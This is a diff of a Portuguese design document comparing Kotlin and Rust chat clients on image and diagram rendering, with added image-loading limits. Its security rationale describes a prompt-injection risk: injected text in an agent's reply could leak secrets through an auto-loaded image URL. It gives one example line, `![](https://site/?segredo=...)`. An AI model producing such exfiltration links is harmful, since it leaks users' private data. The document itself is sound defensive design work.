@@ -47,7 +47,7 @@ vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/comm
 | Copiar bloco de código, código do Mermaid e mensagem inteira | sim | sim | |
 | Tentar de novo após erro de envio | sim | sim | Envio ambíguo continua pedindo confirmação. Pendente de conferência no Rust: conflito de envio ou comando após trocar de conversa. A consulta de status Rust já confere o id da operação. |
 | Blocos `svg` desenhados na conversa, com a mesma tela cheia | sim | sim | desenho local nos dois; `var(--fg)`, `--accent` etc. viram cores fixas sobre fundo branco; Kotlin aceita até 200.000 caracteres |
-| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem cookies do Habblaud; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado; URL solta sem `<>` só no Kotlin |
+| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem cookies do Habblaud; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado; URL solta sem `<>` só no Kotlin. Pendente de conferência no Rust: limites de pixels, cache por bytes, recusa de redirecionamentos e aviso de falha. |
 
 ### Diagramas no cliente Kotlin
 
@@ -68,9 +68,10 @@ Tocar no diagrama abre tela cheia: pinça amplia até 8×, arrastar move, toque 
 
 Baixar imagem remota sozinho deixaria texto injetado na resposta do agente vazar dados pela URL
 (`![](https://site/?segredo=...)`); por isso a remota espera o toque e usa um cliente HTTP sem credenciais.
-Arquivo do host usa a rota e a trava do navegador de arquivos: fora do acesso permitido, fica só o link.
-Falha de carga ou de leitura também deixa só o link. Kotlin junta as imagens no fim da mensagem;
-Rust põe cada uma logo abaixo do parágrafo que a cita.
+Arquivo do host usa a rota e a trava do navegador de arquivos. Se a carga ou a leitura falhar, o link
+permanece no texto. O Kotlin mostra um aviso, não segue redirecionamentos remotos, limita o cache a
+24 MiB e recusa imagens raster acima de 4.096 × 4.096 pixels no total. Kotlin junta as imagens no fim da
+mensagem; Rust põe cada uma logo abaixo do parágrafo que a cita.
 
 ## Verificação
 
